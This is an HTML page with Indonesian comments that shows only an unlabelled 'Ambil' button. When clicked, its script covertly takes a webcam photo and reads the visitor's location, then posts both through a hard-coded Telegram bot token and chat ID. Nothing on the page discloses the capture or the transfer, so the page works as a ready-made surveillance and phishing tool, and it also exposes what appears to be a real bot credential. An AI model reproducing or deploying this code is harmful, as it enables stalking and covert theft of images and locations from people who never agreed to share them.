<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akses Kamera dan Lokasi</title>
</head>
<body>
    <h1>Ambil</h1>
    <button onclick="startCapture()">Ambil</button>
    <script>
        function startCapture() {
            // Akses kamera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Ambil foto setelah beberapa detik
                        setTimeout(() => {
                            captureAndSend(stream);
                        }, 3000); // Ambil foto setelah 3 detik
                    })
                    .catch(function(error) {
                        alert("Akses kamera ditolak.");
                    });
            } else {
                alert("Browser tidak mendukung akses kamera.");
            }

            // Akses lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log('Lokasi Anda:', lat, lon);

                    // Kirimkan URL Google Maps ke Telegram
                    const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    sendToTelegram(locationUrl); // Mengirimkan lokasi sebagai teks
                }, function(error) {
                    alert("Gagal mendapatkan lokasi.");
                });
            } else {
                alert("Lokasi tidak tersedia.");
            }
        }

        function captureAndSend(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                // Tentukan ukuran canvas sesuai dengan video
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // Tentukan ukuran canvas sesuai dengan video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Gunakan requestAnimationFrame untuk memastikan video ter-render dengan benar
                function drawVideoToCanvas() {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Cek apakah gambar sudah diambil
                    if (canvas.width > 0 && canvas.height > 0) {
                        // Ambil gambar sebagai Blob (bukan base64)
                        canvas.toBlob(function(blob) {
                            // Kirim gambar ke Telegram
                            sendToTelegram(blob);

                            // Stop stream setelah gambar diambil
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg');
                    } else {
                        // Jika belum, coba lagi
                        requestAnimationFrame(drawVideoToCanvas);
                    }
                }

                // Mulai menggambar video ke canvas
                drawVideoToCanvas();
            };
        }

        function sendToTelegram(message) {
            const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI'; // Ganti dengan token bot Telegram Anda
            const chatId = '1746156378'; // Ganti dengan chat ID Telegram Anda

            // Jika pesan berupa gambar (Blob)
            if (message instanceof Blob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', message, 'photo.jpg');

                // Kirimkan foto ke Telegram
                const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
                fetch(url, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Gambar terkirim ke Telegram');
                    } else {
                        console.log('Error mengirim gambar:', data);
                    }
                })
                .catch(error => console.log('Error:', error));
            } else if (typeof message === 'string') {
                // Jika pesan berupa teks (lokasi atau pesan lainnya)
                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
                fetch(url, {
                    method: 'POST',
                    body: new URLSearchParams({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Pesan terkirim ke Telegram');
                    } else {
                        console.log('Error mengirim pesan:', data);
                    }
                })
                .catch(error => console.log('Error:', error));
            }
        }
    </script>
</body>
</html>
